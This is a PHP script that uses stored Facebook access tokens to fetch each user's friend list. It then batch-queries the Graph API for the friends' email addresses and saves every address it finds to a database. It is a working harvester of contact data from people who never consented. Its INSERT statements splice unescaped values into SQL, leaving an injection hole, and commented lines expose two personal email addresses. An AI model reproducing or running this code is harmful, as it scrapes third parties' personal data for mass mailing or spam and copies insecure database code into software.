<?php

require_once("objects/dbclass.php");
require_once("objects/logger.php");

Logger::bootup();
$dbobject = new dbclass();
$dbobject->connect();

$result = $dbobject->execute("select * from user_details");

//print_r($result);

while(($row=$result->fetch_assoc())!=NULL){
 echo $row['email'] . "\n";
 $email = $row['email'];
 try { 
  if(isset($email) && trim($email)!="") $dbobject->execute("Insert IGNORE into emails (email) values ('$email')"); 
 }catch(Exception $e){ 
  echo "Exception " . $e->getMessage();
 }
 $data = json_decode(get_data(getFriendsQuery($row['fbid'],$row['fbtoken'])),1); 
 //print_r($data);
 if(isset($data['friends']['data'])){
  $friends = $data['friends']['data'];
  for($i=0; $i<count($friends);){
   $batch = array();
   for($j=0;$j<50;$j++){
    $cls = new stdClass();
    $cls->method = "GET";
    $cls->relative_url = $friends[$i]['id'] . "/?fields=email";
    $batch[] = $cls;
    $i++; if($i>=count($friends)) break;
   }
   $post_data = array();
   $post_data['access_token'] = $row['fbtoken'];
   $post_data['batch'] = json_encode($batch);
   //print_r($post_data);
   $resps = json_decode(makeBatchQuery($post_data),1);
   //print_r($resps);
   //$resps[]['body'] = "{\"email\":\"khaneja.khaneja@gmail.com\"}";
   //$resps[]['body'] = "{\"email\":\"khaneja.gourav@gmail.com\"}";
   $sql = "Insert IGNORE into emails (email) values ";
   $count=0;
   foreach($resps as $resp){
    $body = json_decode($resp['body'],1);
    //print_r($body);
    //echo "\n";
    if(isset($body['email'])){
       $email = $body['email'];
       echo "\t$email\n";
       if($count==0){
        $sql .= "('$email')"; 
       }else{
        $sql .= ",('$email')"; 
       }
       $count++;
    }
   }
   if($count>0){
    try { 
        $dbobject->execute($sql);
    }catch(Exception $e){ 
      echo "Exception " . $e->getMessage();
    }
   }else{
     echo "\tFriend's emails are not public\n";
   }       
  }
 }else{
  echo "\tToken expired\n";
 }
}


function getEmailQuery($id, $token){
 $fbURL = "https://graph.facebook.com/";
 $url = $fbURL . $id . "?fields=email&access_token=" . $token;
 //echo $url . "\n";
 return $url;
}

function getFriendsQuery($id, $token){
 $fbURL = "https://graph.facebook.com/";
 $url = $fbURL . $id . "?fields=friends&access_token=" . $token;
 //echo $url . "\n";
 return $url;
}

function makeBatchQuery($post_data){
 $fburl = "https://graph.facebook.com/";
 $ch = curl_init();
 $timeout = 5;
 curl_setopt($ch,CURLOPT_URL,$fburl);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
 curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data);
 //curl_setopt($ch,CURLOPT_POST,true);
 $data = curl_exec($ch);
 curl_close($ch);
 //echo $data . "\n";
 return $data;
}

function get_data($url) {
 $ch = curl_init();
 $timeout = 5;
 curl_setopt($ch,CURLOPT_URL,$url);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
 $data = curl_exec($ch);
 curl_close($ch);
 return $data;
}

?>
